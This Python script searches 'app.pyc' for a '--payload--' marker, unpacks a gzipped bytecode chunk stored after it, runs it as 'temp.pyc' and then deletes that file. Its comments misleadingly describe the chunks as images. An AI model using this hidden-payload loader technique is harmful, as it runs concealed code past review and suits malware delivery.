import os
import sys
import gzip
import subprocess
import time
import io
from PIL import Image

with open("./app.pyc", 'rb') as file:
    data_byte = file.read()
    file.close()

bytes_pos   = 0
image_index = 0
pos         = 0

while pos < len(data_byte):
    if data_byte[pos] == ord('-') and data_byte[pos + 1] == ord('-') and data_byte[pos + 2] == ord('p'):
        if data_byte[pos + 3] == ord('a') and data_byte[pos + 4] == ord('y') and data_byte[pos + 5] == ord('l'):
            if data_byte[pos + 6] == ord('o') and data_byte[pos + 7] == ord('a') and data_byte[pos + 8] == ord('d'):
                if data_byte[pos + 9] == ord('-') and data_byte[pos + 10] == ord('-'):
                    bytes_pos = pos + 10
                    break;
    pos += 1

if bytes_pos == 0:
    print("error: invalide data")
    sys.exit(1)

with open("./app.pyc", "rb") as file:
    file.seek(bytes_pos + 1)
    index = 0
    while True:
        # Read the length of the next compressed image
        length_bytes = file.read(4)
        if not length_bytes:
            break
        length = int.from_bytes(length_bytes, byteorder='big')
        compressed_data = file.read(length)
        if index == image_index:
            byte_stream = io.BytesIO(compressed_data)
            with gzip.GzipFile(fileobj=byte_stream) as gz_file:
                bytecode_bytestream = gz_file.read()
                with open("./temp.pyc","wb") as fout:
                    fout.write(bytecode_bytestream)
                    fout.close()
                result = os.system("python temp.pyc")
                os.remove("./temp.pyc")
                sys.exit(0)
                #return image
        index += 1
    file.close()

print("something went wrong.")
sys.exit(0)
